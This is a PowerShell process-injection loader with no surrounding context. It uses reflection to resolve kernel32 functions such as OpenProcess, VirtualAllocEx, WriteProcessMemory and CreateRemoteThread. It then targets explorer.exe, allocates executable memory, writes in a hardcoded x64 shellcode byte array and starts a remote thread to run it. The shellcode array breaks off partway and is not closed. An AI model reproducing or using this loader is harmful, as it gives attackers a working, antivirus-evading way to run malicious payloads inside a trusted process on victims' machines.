function getExplorer {
    Param ([String]$processName)

    $query = "SELECT * FROM Win32_Process WHERE Name = '$processName'"
    $process = Get-WmiObject -Query $query | Select-Object -First 1
    return $process.ProcessId
}

function LookupFunc {

    Param ([String]$moduleName, [String]$functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    $moduleHandle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    return $tmp[0].Invoke($null, @($moduleHandle, $functionName))

}

function getDelegateType {

    Param ([Type[]]$func, [Type]$delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()

}

$processPid = getExplorer "explorer.exe"
$outSize = [IntPtr]::Zero

#shellcode x64...
[Byte[]] $buf = 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,0x52,0x20,0x56,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2

$openProcessExpDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc "kernel32.dll" "OpenProcess"), (getDelegateType @([UInt32], [bool], [UInt32]) ([IntPtr])))
$execOpen = $openProcessExpDelegate.Invoke(0x001F0FFF, $false, $processPid)
$virtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc "kernel32.dll" "VirtualAllocEx"), (getDelegateType @([IntPtr],[IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$execVirtualAlloc = $virtualAllocExDelegate.Invoke($execOpen, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
$writeProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc "kernel32.dll" "WriteProcessMemory"), (getDelegateType @([IntPtr],[IntPtr], [Byte[]], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
$execWrite = $writeProcessDelegate.Invoke($execOpen, $execVirtualAlloc, $buf, $buf.Length, [ref]$outSize)
$createThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc "kernel32.dll" "CreateRemoteThread"), (getDelegateType @([IntPtr],[IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
$execCreateThread = $createThreadDelegate.Invoke($execOpen, [IntPtr]::Zero, 0, $execVirtualAlloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
